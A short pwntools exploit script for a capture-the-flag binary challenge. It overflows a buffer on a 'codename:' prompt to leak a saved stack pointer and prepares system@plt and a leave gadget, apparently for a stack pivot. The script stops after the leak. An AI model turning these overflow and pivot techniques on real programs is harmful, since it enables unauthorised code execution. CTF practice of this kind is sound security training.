from pwn import *
context.log_level='debug'
io = process('./pwn')
#io = remote('127.0.0.1',10000)
#io = remote('pwn.challenge.ctf.show',28151)
elf = ELF('./pwn')
system = elf.plt['system']
leave = 0x08048766
payload = 'a' * 0x24 + 'show'
io.recvuntil('codename:')
io.send(payload)
io.recvuntil('show')
ebp = u32(io.recv(4))
